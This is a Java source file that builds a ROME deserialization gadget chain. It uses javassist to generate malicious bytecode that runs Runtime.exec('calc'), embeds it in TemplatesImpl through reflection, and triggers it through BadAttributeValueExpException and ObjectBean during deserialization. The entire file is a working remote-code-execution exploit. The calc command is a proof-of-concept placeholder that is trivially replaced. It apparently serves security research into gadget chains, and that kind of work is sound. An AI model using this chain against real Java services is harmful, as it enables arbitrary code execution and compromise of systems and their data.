package Rome;
/**
 * @author:Firebasky
 * BadAttributeValueExpException.readObject()
 *    ToStringBean.toString()
 *        TemplatesImpl.getOutputProperties()
 */

import Tools.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;

public class Rome {
    public static String fileName = "Rome.bin";
    public static void main(String[] args) throws Exception {
        //javassist生成恶意字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        SerializeUtil.setFieldValue(templates, "_bytecodes", targetByteCodes);
        SerializeUtil.setFieldValue(templates, "_name", "name");
        SerializeUtil.setFieldValue(templates, "_class", null);
        //封装字节码
        ObjectBean objectBean = new ObjectBean(Templates.class,templates);
        //触发tostring方法
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("");
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException,objectBean);
        //反序列化
        SerializeUtil.writeObjectToFile(badAttributeValueExpException, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
